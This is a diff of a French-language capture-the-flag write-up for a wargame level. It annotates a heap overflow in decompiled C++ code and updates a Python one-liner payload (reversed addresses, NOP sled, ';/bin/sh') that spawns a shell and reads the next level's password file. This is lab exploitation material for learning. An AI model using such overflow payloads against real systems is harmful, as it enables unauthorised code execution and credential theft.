@@ -34,9 +34,9 @@ class N
         {
         }
 
-        void setAnnotation(char *input)
+        void setAnnotation(char *input) // <----2 writes into the 100 bytes buffer with a user defined limit = heap overflow
         {
-            memcpy(annotation, input, strlen(input));
+            memcpy(annotation, input, strlen(input)); 
         }
 
         virtual int operator+(N &some)
@@ -50,28 +50,28 @@ class N
         }
 
     private:
-        char annotation[100];
+        char annotation[100]; // <--------------1 100 bytes buffer declared here
         int number;
 };
 
-int main(int ac, char **av)
+int main(int argc, char **argv)
 {
-	if (ac <= 1)
+	if (argc <= 1)
         exit(1);
 
-	N *five = new N(5);
+	N *five = new N(5); // <--------------------3 first reference
 	N *six = new N(6);
 
-	N &five = *five
+	N &five = *five // <------------------------4 second reference
     N &six = *six;
 
 	five.setAnnotation(argv[1]);
 
-	return five + six;
+	return five + six; // <---------------------5 N is evaluated and will double jump to shellcode due to the overflow
 }
 ```
 Oh... Il semble qu'on ai à faire à du `C++` ici.
-Cette reconstitution s'appuie principalement sur la décompilation par `Hexray` en unifiant l'ensemble dans une `class` nommée `N`.
+Cette reconstitution s'appuie principalement sur la décompilation par `Hexray` en unifiant l'ensemble dans une `classe` nommée `N`.
 
 A priori, pas d'appel à `bin/sh` dans le code, il va donc me falloir utiliser l'une des méthodes des premiers niveaux, notamment celle d'exécution arbitraire de fonction dans la `libc` (`Ret2Libc`), si `C++` me le permet.
 
@@ -163,7 +163,7 @@ Je peux créer un payload infecté :
 
 ```python
 #                |    system()    |         | NOP sled |    | annotation[0] |         | system(args) |    
-python -c 'print "\xb7\xd8\x60\x60"[::-1] + "\x90" * 104 + "\x08\x04\xa0\x0c"[::-1] + ";/bin/sh"'
+python -c 'print("\xb7\xd8\x60\x60"[::-1] + "\x90" * 104 + "\x08\x04\xa0\x0c"[::-1] + ";/bin/sh")'
 ```
 
 Ce payload aura pour effet d'overflow après le padding de 104 bytes (108 - l'adresse de `system()`), trouvera une adresse qui pointe sur le début d'`annotation`, ce qui exécutera le début de `annotation`, et donc `system()`, qui prendra comme argument le `NOP sled` (le padding), l'adresse qui pointait vers `annotation`, puis pour ignorer le 'bruit' précédent, passera `;bin/sh` avec un ';' afin que l'instruction précédente soit simplement un échec et que le shell soit ensuite exécuté.
@@ -172,7 +172,7 @@ Je teste mon payload :
 
 ```bash
 
-$ ./level9 $(python -c 'print "\xb7\xd8\x60\x60"[::-1] + "\x90" * 104 + "\x08\x04\xa0\x0c"[::-1] + ";/bin/sh"')
+$ ./level9 $(python -c 'print("\xb7\xd8\x60\x60"[::-1] + "\x90" * 104 + "\x08\x04\xa0\x0c"[::-1] + ";/bin/sh")')
 sh: 1:
        : not found
 $ cat /home/user/bonus0/.pass
